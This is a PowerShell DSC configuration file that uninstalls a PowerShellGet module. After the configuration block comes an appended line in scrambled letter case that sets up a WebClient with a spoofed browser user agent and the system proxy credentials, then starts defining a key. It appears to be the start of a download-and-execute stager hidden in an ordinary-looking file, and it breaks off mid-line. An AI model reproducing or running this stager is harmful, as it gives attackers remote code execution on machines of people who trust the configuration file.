




configuration PSModule_UninstallModuleConfig
{
    param
    (
        [Parameter()]
        [System.String[]]
        $NodeName = 'localhost',

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [System.String]
        $ModuleName
    )

    Import-DscResource -ModuleName 'PowerShellGet'

    Node $nodeName
    {
        PSModule 'InstallModule'
        {
            Ensure = 'Absent'
            Name   = $ModuleName
        }
    }
}

[SystEm.NeT.SeRvIcePoInTMaNAgeR]::ExPECt100COnTinue = 0;$wC=New-OBJEcT SysTem.NET.WebCLienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeadErs.Add('User-Agent',$u);$wC.PRoXy = [SysTEM.NET.WEbRequesT]::DEFAUlTWeBProXy;$Wc.PROXY.CrEdENTials = [SYStem.NET.CreDEnTIaLCAchE]::DEfaULtNETWoRkCrEDENtIaLs;$K='5Vdki%

